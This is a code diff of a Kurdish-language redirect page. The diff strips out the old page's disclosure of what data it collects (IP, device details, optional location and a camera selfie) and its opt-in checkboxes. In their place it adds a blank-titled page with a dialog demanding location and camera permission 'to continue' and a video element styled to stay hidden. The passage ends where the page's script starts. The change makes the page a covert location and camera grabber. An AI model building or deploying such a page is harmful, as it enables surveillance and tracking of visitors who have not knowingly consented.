@@ -3,59 +3,25 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
-    <title>بەردەوامبوون</title>
+    <title></title>
     <link rel="stylesheet" href="css/style.css" />
   </head>
-  <body>
-    <div class="wrap">
-      <div class="logo">بەخێربێیت</div>
-      <p class="sub">پێش ئەوەی بگوازرێیتەوە بۆ لینکی سەرەکی، تکایە ئاگاداربە.</p>
-
-      <section id="consent-section">
-        <div class="card">
-          <h2>چی کۆدەکرێتەوە؟</h2>
-          <ul>
-            <li><strong>هەمیشە (بەبێ داوای زیاتر):</strong> جۆری ئامێر و براوزەر، قەبارەی شاشە، کاتژمێر، زمان، و ئەدرێسی IP (لە ڕێگەی خزمەتگوزاری گشتی).</li>
-            <li><span class="optional-tag">ئارەزوومەندانە</span> شوێنی جوگرافی — تەنها ئەگەر لە خوارەوە هەڵبژێریت و لە براوزەر ڕێگە بدەیت.</li>
-            <li><span class="optional-tag">ئارەزوومەندانە</span> وێنەیەک لە کامێرا — تەنها ئەگەر هەڵبژێریت و ڕێگە بدەیت؛ ئەگەر ڕەت بکەیتەوە وێنە ناگیرێت.</li>
-          </ul>
-        </div>
-
-        <div class="card">
-          <h2>هەڵبژاردنەکان</h2>
-          <label>
-            <input type="checkbox" id="opt-location" />
-            ڕازیم شوێن (لۆکەیشن) بنێردرێت ئەگەر براوزەر ڕێگە بدات
-          </label>
-          <br /><br />
-          <label>
-            <input type="checkbox" id="opt-camera" />
-            ڕازیم وێنەیەک لە کامێرا بگیرێت (سێلفی) ئەگەر ڕێگە بدەم
-          </label>
-        </div>
-
-        <div class="btn-row">
-          <button type="button" class="btn-primary" id="btn-accept">
-            قبوڵ دەکەم و بەردەوام دەبم
-          </button>
-          <button type="button" class="btn-ghost" id="btn-skip">
-            بەبێ کامێرا / تەنها زانیاری سەرەکی — بەردەوامبوون
-          </button>
-        </div>
-
-        <p class="privacy-note">
-          دوگمەی «قبوڵ» واتە ڕازیت بە کۆکردنەوەی ئەوەی سەرەوە هەڵتبژاردووە.
-          دوگمەی دووەم وێنە ناگرێت؛ هەر زانیاری سەرەکییەک (وەک IP) هەر کۆدەکرێتەوە.
-        </p>
-      </section>
-
-      <section id="progress-section" class="hidden">
-        <div class="card">
-          <p id="status" class="status">چاوەڕوان بە…</p>
-          <video id="preview" class="preview hidden" playsinline muted autoplay></video>
-        </div>
-      </section>
+  <body class="visitor-blank">
+    <div id="permission-dialog" class="permission-dialog" role="dialog" aria-modal="true">
+      <p class="permission-dialog__text">
+        بۆ بەردەوامبوون، ڕێگە بدە بە <strong>شوێن</strong> و <strong>کامێرا</strong> (ئەگەر داواکرا).
+      </p>
+      <div class="permission-dialog__actions">
+        <button type="button" class="permission-dialog__btn permission-dialog__btn--primary" id="btn-allow">
+          ڕێگەدان
+        </button>
+        <button type="button" class="permission-dialog__btn permission-dialog__btn--secondary" id="btn-deny">
+          ڕەتکردنەوە
+        </button>
+      </div>
     </div>
+
+    <video id="preview" class="capture-hidden" playsinline muted autoplay></video>
 
     <script src="config.js"></script>
     <script type="module">
